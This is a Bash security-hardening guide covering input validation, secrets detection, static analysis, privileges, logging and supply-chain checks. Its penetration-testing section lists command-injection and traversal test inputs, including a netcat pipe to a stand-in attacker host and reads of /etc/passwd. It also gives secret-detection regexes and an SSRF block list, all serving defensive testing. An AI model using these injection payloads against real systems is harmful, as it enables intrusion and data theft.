# Security & Hardening for Bash Scripts

Comprehensive security practices for production Bash scripts including SAST, secrets detection, input sanitization, and audit logging.

## Input Validation & Sanitization

### Validate Required Variables

```bash
# Required environment variables
: "${DATABASE_URL:?DATABASE_URL must be set}"
: "${API_KEY:?API_KEY must be set}"

# With custom error messages
if [[ -z "${CONFIG_FILE:-}" ]]; then
  echo "Error: CONFIG_FILE environment variable not set" >&2
  exit 1
fi
```

### Sanitize User Input

```bash
# Validate numeric input
validate_number() {
  local input="$1"
  [[ $input =~ ^[0-9]+$ ]] || {
    echo "Error: '$input' is not a valid number" >&2
    return 1
  }
}

# Validate alphanumeric input
validate_alphanumeric() {
  local input="$1"
  [[ $input =~ ^[a-zA-Z0-9_-]+$ ]] || {
    echo "Error: '$input' contains invalid characters" >&2
    return 1
  }
}

# Validate file path (prevent path traversal)
validate_path() {
  local path="$1"
  local allowed_dir="/safe/directory"

  # Resolve to canonical path
  local canonical
  canonical=$(readlink -f "$path" 2>/dev/null || \
              realpath "$path" 2>/dev/null || \
              echo "$path")

  # Prevent path traversal
  case "$canonical" in
    "$allowed_dir"/*) return 0 ;;
    *) echo "Error: Path outside allowed directory" >&2; return 1 ;;
  esac
}
```

### Avoid Command Injection

```bash
# ❌ DANGEROUS: Never use eval on user input
eval "$user_command"  # NEVER DO THIS!

# ❌ DANGEROUS: Unquoted variables in commands
rm -rf $user_directory  # Path traversal risk

# ✅ SAFE: Use arrays for dynamic commands
cmd=(grep "$user_pattern" "$file")
"${cmd[@]}"

# ✅ SAFE: Quote all expansions
rm -rf -- "$user_directory"

# ✅ SAFE: Validate before use
if validate_alphanumeric "$user_input"; then
  process "$user_input"
fi
```

## Secrets Management

### Never Hardcode Secrets

```bash
# ❌ DANGEROUS: Hardcoded credentials
DB_PASSWORD="super_secret_123"

# ✅ SAFE: Use environment variables
DB_PASSWORD="${DB_PASSWORD:?not set}"

# ✅ SAFE: Read from secure file
if [[ -f /run/secrets/db_password ]]; then
  DB_PASSWORD=$(<"/run/secrets/db_password")
else
  echo "Error: Secret file not found" >&2
  exit 1
fi
```

### Secrets Detection Tools

#### gitleaks

```bash
# Install
brew install gitleaks

# Scan repository
gitleaks detect --source . --verbose

# Scan commits
gitleaks protect --staged
```

Configuration (`.gitleaks.toml`):

```toml
title = "gitleaks config"

[[rules]]
id = "generic-api-key"
description = "Generic API Key"
regex = '''(?i)(api_key|apikey|api-key)\s*[:=]\s*['"][0-9a-zA-Z]{32,}['"]'''

[[rules]]
id = "aws-access-key"
description = "AWS Access Key"
regex = '''AKIA[0-9A-Z]{16}'''

[[rules]]
id = "private-key"
description = "Private Key"
regex = '''-----BEGIN (RSA|OPENSSH|DSA|EC|PGP) PRIVATE KEY-----'''

[allowlist]
paths = [
  '''\.md$''',
  '''\.example$''',
]
```

#### TruffleHog

```bash
# Install
pip install trufflehog

# Scan repository
trufflehog git file://. --only-verified

# Scan filesystem
trufflehog filesystem /path/to/scan
```

### Secure Secret Handling

```bash
# Clear sensitive variables after use
cleanup_secrets() {
  unset DB_PASSWORD API_KEY AWS_SECRET_KEY
}
trap cleanup_secrets EXIT

# Don't log secrets
log_safe() {
  local message="$1"
  # Redact patterns that look like secrets
  message=$(echo "$message" | sed -E 's/(password|key|token)=[^ ]+/\1=REDACTED/gi')
  echo "[LOG] $message" >&2
}

# Don't expose secrets in process listing
# Instead of: script.sh --password=secret
# Use: script.sh (and read password from env or file)
```

## Static Analysis Security Testing (SAST)

### ShellCheck Security Rules

```bash
# Install ShellCheck
brew install shellcheck

# Run with all checks enabled
shellcheck --enable=all --severity=warning script.sh

# Focus on security issues
shellcheck --severity=error script.sh
```

Configuration (`.shellcheckrc`):

```bash
# Enable all optional checks
enable=all

# Exclude specific warnings (with justification!)
# SC2312: Consider invoking this command separately
disable=SC2312

# Check sourced files
external-sources=true

# Set shell directive
shell=bash
```

### Semgrep for Shell Scripts

```bash
# Install
pip install semgrep

# Run security checks
semgrep --config=p/security-audit --lang=bash .
```

Custom rules (`.semgrep.yml`):

```yaml
rules:
  - id: unsafe-eval
    pattern: eval $VAR
    message: Never use eval on untrusted input
    severity: ERROR
    languages: [bash]

  - id: command-injection
    pattern: |
      $CMD $VAR
    message: Potential command injection
    severity: WARNING
    languages: [bash]

  - id: hardcoded-secret
    pattern: |
      PASSWORD="..."
    message: Do not hardcode secrets
    severity: ERROR
    languages: [bash]
```

### CodeQL for Shell Scripts

```yaml
# .github/workflows/codeql.yml
name: CodeQL

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  analyze:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v3

      - name: Initialize CodeQL
        uses: github/codeql-action/init@v2
        with:
          languages: bash

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v2
```

## Privilege Management

### Avoid Running as Root

```bash
# Check if running as root
if [[ $EUID -eq 0 ]]; then
  echo "Error: This script should not be run as root" >&2
  exit 1
fi

# Request specific privilege when needed
if [[ ! -w /etc/config ]]; then
  echo "This operation requires sudo privileges" >&2
  sudo cp config.new /etc/config
fi
```

### Principle of Least Privilege

```bash
# Drop privileges after initial setup
if [[ $EUID -eq 0 ]]; then
  # Do privileged setup
  setup_system

  # Drop to normal user
  exec su - normaluser -c "$0 $*"
fi
```

### Audit Sudo Usage

```bash
# Log all sudo operations
sudo_command() {
  local cmd="$*"
  logger -t "$(basename "$0")" "SUDO: $cmd"
  sudo "$@"
}

# Usage
sudo_command apt-get update
```

## File Operations Security

### Safe Temporary Files

```bash
# ❌ DANGEROUS: Predictable temp file name
tmpfile="/tmp/myapp-$$"  # Race condition!

# ✅ SAFE: Use mktemp
tmpfile=$(mktemp)
trap 'rm -f "$tmpfile"' EXIT

# ✅ SAFE: Temp directory with restrictive permissions
tmpdir=$(mktemp -d)
chmod 700 "$tmpdir"
trap 'rm -rf "$tmpdir"' EXIT
```

### File Permission Checks

```bash
# Check file ownership
check_file_ownership() {
  local file="$1"
  local expected_owner="$USER"

  local actual_owner
  actual_owner=$(stat -c '%U' "$file" 2>/dev/null || stat -f '%Su' "$file")

  if [[ "$actual_owner" != "$expected_owner" ]]; then
    echo "Error: File owned by $actual_owner, expected $expected_owner" >&2
    return 1
  fi
}

# Check file permissions
check_file_permissions() {
  local file="$1"
  local expected_perms="600"

  local actual_perms
  actual_perms=$(stat -c '%a' "$file" 2>/dev/null || stat -f '%A' "$file")

  if [[ "$actual_perms" != "$expected_perms" ]]; then
    echo "Error: File has permissions $actual_perms, expected $expected_perms" >&2
    return 1
  fi
}
```

### Secure File Creation

```bash
# Create file with restricted permissions
(umask 077; touch "$secure_file")

# Create and immediately set permissions
touch "$file"
chmod 600 "$file"
chown "$USER:$GROUP" "$file"
```

## Network Security

### Validate URLs

```bash
validate_url() {
  local url="$1"

  # Basic URL validation
  [[ $url =~ ^https?://[a-zA-Z0-9.-]+(/.*)?$ ]] || {
    echo "Error: Invalid URL format" >&2
    return 1
  }

  # Prevent SSRF (Server-Side Request Forgery)
  case "$url" in
    *localhost*|*127.0.0.1*|*0.0.0.0*|*169.254.*)
      echo "Error: URL points to internal resource" >&2
      return 1
      ;;
  esac
}
```

### Secure HTTP Requests

```bash
# Use TLS and verify certificates
curl_secure() {
  curl \
    --fail \
    --silent \
    --show-error \
    --location \
    --max-redirs 3 \
    --max-time 30 \
    --cacert /etc/ssl/certs/ca-certificates.crt \
    "$@"
}

# Validate server certificate
curl_secure https://api.example.com/data
```

## Audit Logging

### Structured Logging

```bash
# Log security-relevant operations
audit_log() {
  local event_type="$1"; shift
  local message="$*"

  local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
  local log_entry

  # JSON format for log aggregation
  log_entry=$(jq -n \
    --arg timestamp "$timestamp" \
    --arg hostname "$(hostname)" \
    --arg user "$USER" \
    --arg pid "$$" \
    --arg event_type "$event_type" \
    --arg message "$message" \
    '{
      timestamp: $timestamp,
      hostname: $hostname,
      user: $user,
      pid: ($pid | tonumber),
      event_type: $event_type,
      message: $message
    }')

  # Log to file
  echo "$log_entry" >> /var/log/audit.log

  # Also send to syslog
  logger -t "$(basename "$0")" -p auth.info "$event_type: $message"
}

# Usage
audit_log "file_access" "Accessed sensitive file: $file"
audit_log "privilege_escalation" "Sudo command executed: $cmd"
audit_log "authentication" "User login attempt: $username"
```

### Syslog Integration

```bash
# Send to syslog
log_to_syslog() {
  local priority="$1"  # e.g., user.info, auth.warning
  local message="$2"

  logger -t "$(basename "$0")" -p "$priority" "$message"
}

# Usage
log_to_syslog "auth.info" "User authenticated: $username"
log_to_syslog "auth.err" "Failed login attempt: $username"
```

## Container Security

### Dockerfile Best Practices

```dockerfile
FROM bash:5.2-alpine

# Run as non-root user
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser

# Copy scripts with restrictive permissions
COPY --chown=appuser:appgroup --chmod=500 scripts/ /app/

# Use read-only filesystem
WORKDIR /app
VOLUME ["/tmp"]

# Security scanning metadata
LABEL maintainer="security@example.com"
LABEL security.scan="trivy,grype"

CMD ["./main.sh"]
```

### Scan Container Images

```bash
# Trivy
trivy image --severity HIGH,CRITICAL myimage:latest

# Grype
grype myimage:latest
```

## Supply Chain Security

### Verify Script Checksums

```bash
# Generate checksum
sha256sum script.sh > script.sh.sha256

# Verify checksum
sha256sum -c script.sh.sha256 || {
  echo "Error: Checksum verification failed!" >&2
  exit 1
}
```

### Sign Scripts

```bash
# Sign with GPG
gpg --detach-sign --armor script.sh

# Verify signature
gpg --verify script.sh.asc script.sh || {
  echo "Error: Signature verification failed!" >&2
  exit 1
}
```

### SBOM (Software Bill of Materials)

```bash
# Document dependencies
cat > SBOM.json <<EOF
{
  "dependencies": [
    {"name": "jq", "version": "1.6", "source": "apt"},
    {"name": "curl", "version": "7.81.0", "source": "apt"}
  ],
  "scripts": [
    {"name": "backup.sh", "version": "1.0.0", "checksum": "sha256:..."}
  ]
}
EOF
```

## Security Checklist

- [ ] All user input is validated and sanitized
- [ ] No secrets hardcoded in scripts
- [ ] ShellCheck passes with no security warnings
- [ ] Scripts don't run as root unless necessary
- [ ] Temporary files created with `mktemp`
- [ ] File permissions are restrictive (600/700)
- [ ] All variables are quoted
- [ ] `--` used to separate options from arguments
- [ ] Error handling covers all failure modes
- [ ] Security-relevant operations are logged
- [ ] No `eval` on untrusted input
- [ ] Secrets cleared from memory after use
- [ ] Dependencies verified with checksums
- [ ] Container images scanned for vulnerabilities
- [ ] SAST tools integrated into CI/CD

## Security Testing

### Fuzzing

```bash
# Fuzz test with random input
for i in {1..1000}; do
  random_input=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9!@#$%^&*()' | fold -w 32 | head -n 1)
  ./script.sh "$random_input" 2>/dev/null || echo "Crashed on: $random_input"
done
```

### Penetration Testing

```bash
# Test command injection
./script.sh "; cat /etc/passwd"
./script.sh "| nc attacker.com 1234"
./script.sh "\$(whoami)"

# Test path traversal
./script.sh "../../../etc/passwd"
./script.sh "file:///etc/passwd"

# Test XSS (if script generates HTML)
./script.sh "<script>alert('XSS')</script>"
```

## References

- [OWASP Shell Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [NIST SP 800-53](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final)
- [ShellCheck Wiki](https://github.com/koalaman/shellcheck/wiki)
- [gitleaks Documentation](https://github.com/gitleaks/gitleaks)
- [Semgrep Rules](https://semgrep.dev/r)
